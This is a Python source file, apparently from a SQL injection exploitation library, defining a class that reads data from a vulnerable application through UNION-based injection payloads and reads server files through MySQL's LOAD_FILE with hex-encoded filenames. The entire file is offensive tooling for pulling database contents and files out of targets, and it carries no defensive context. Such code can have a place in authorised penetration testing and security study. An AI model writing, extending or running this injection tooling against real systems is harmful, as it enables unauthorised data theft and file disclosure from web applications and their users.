from pyic import SqliEncoder
from pyic.string_finder import StringFinder


class UnionStringFinder(StringFinder):
    """
    This class can get a string with the union technique
    """

    def __init__(self, union_payload, request_builder, response_extractor, logger=None):
        """
        Create a new UnionStringFinder. To do this, we need :
        - a union payload, ie 'UNION ALL SELECT 1,2,{}'
        - a request builder, that take a payload and return a requests response
        - a response extractor, that extract a string from a response

        :param union_payload union payload, ie 'UNION ALL SELECT 1,2,{}', with '{}' for the string to read
        :param request_builder: callable that take a payload to return a response
        :param response_extractor: callable that take a response and return a string
        :param logger: if not None, use a logger (see loggers.py). For Http use logger=HttpLogger()
        """
        self.union_payload = union_payload
        self.request_builder = request_builder
        self.response_extractor = response_extractor
        self.logger = logger

    def read_string(self, sql):
        r = self.request_builder(self.union_payload.format(sql))
        if self.logger is not None:
            self.logger(r)
        return self.response_extractor(r)

    def read_file(self, filename):
        return self.read_string('LOAD_FILE({})'.format(SqliEncoder.str_to_hexa(filename)))
